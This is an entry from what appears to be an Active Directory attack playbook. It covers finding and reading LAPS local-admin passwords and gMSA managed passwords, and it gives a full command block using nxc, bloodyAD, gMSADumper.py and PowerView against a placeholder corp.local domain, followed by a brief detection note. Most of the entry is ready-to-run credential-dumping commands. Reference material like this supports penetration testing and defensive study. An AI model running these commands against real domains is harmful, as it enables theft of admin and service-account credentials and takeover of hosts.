---
id: laps_gmsa
type: technique
label: "LAPS / gMSA readable-password discovery"
phase: "recon"
tools: ["lapstoolkit", "powerview"]
cve: null
detect: "LDAP reads of ms-Mcs-AdmPwd or msDS-ManagedPassword."
mitre: "T1552"
tag: null
---


# LAPS / gMSA readable-password discovery

### Affected object / attribute
**`ms-Mcs-AdmPwd` / `msLAPS-Password`** (LAPS) and **`msDS-ManagedPassword`** (gMSA).

### Concept (deep)
LAPS stores per-host local admin passwords in AD; gMSA stores a managed password blob. Read access to either = **host admin** or **service-account compromise**.

### Exhaustive commands
```bash
# ── LAPS read ────────────────────────────────────────────────────────
nxc ldap dc.corp.local -u lowpriv -p 'Password123!' -M laps
bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
  get object 'CN=WS01,CN=Computers,DC=corp,DC=local' --attr ms-Mcs-AdmPwd

# ── gMSA read ────────────────────────────────────────────────────────
nxc ldap dc.corp.local -u lowpriv -p 'Password123!' --gmsa
python3 gMSADumper.py -u lowpriv -p 'Password123!' -d corp.local

# ── PowerView ACL check ─────────────────────────────────────────────
Get-DomainObjectAcl -LDAPFilter '(ms-mcs-AdmPwdExpirationTime=*)' -ResolveGUIDs
```

### Detection
**4662** reads of `ms-Mcs-AdmPwd`/`msDS-ManagedPassword`; delegate LAPS read to a narrow group; use Windows LAPS encryption.

---
